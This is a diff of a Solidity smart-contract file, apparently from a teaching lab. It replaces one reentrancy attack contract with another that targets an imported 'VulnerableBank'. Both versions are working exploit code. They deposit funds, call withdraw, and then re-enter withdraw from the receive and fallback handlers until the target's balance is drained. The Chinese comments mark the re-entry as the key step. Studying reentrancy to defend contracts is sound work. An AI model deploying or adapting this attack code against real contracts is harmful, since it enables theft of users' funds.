@@ -1,35 +1,41 @@
 // SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
 
-pragma solidity ^0.8.10;
+import "./victim.sol";
 
-interface IDao {
-    function withdraw() external ;
-    function deposit()external  payable;
- }
+contract Attack {
+    VulnerableBank public vulnerableBank;
+    uint256 public attackAmount;
 
-contract Hacker{
-    IDao dao; 
-
-    constructor(address _dao){
-        dao = IDao(_dao);
+    constructor(address _vulnerableBank) {
+        vulnerableBank = VulnerableBank(_vulnerableBank);
     }
 
-    function attack() public payable {
-        // Seed the Dao with at least 1 Ether.
-        require(msg.value >= 1 ether, "Need at least 1 ether to commence attack.");
-        dao.deposit{value: msg.value}();
-
-        // Withdraw from Dao.
-        dao.withdraw();
+    // 先存一点钱，方便触发 withdraw
+    function depositToBank() external payable {
+        vulnerableBank.deposit{value: msg.value}();
     }
 
-    fallback() external payable{
-        if(address(dao).balance >= 1 ether){
-            dao.withdraw();
+    // 发起攻击
+    function attack(uint256 _amount) external {
+        attackAmount = _amount;
+        vulnerableBank.withdraw(_amount);
+    }
+
+    // 关键：fallback 函数被调用时再次重入
+    receive() external payable {
+        if (address(vulnerableBank).balance >= attackAmount) {
+            vulnerableBank.withdraw(attackAmount);
         }
     }
 
-    function getBalance()public view returns (uint){
+    fallback() external payable {
+        if (address(vulnerableBank).balance >= attackAmount) {
+            vulnerableBank.withdraw(attackAmount);
+        }
+    }
+
+    function getBalance() external view returns (uint256) {
         return address(this).balance;
     }
 }
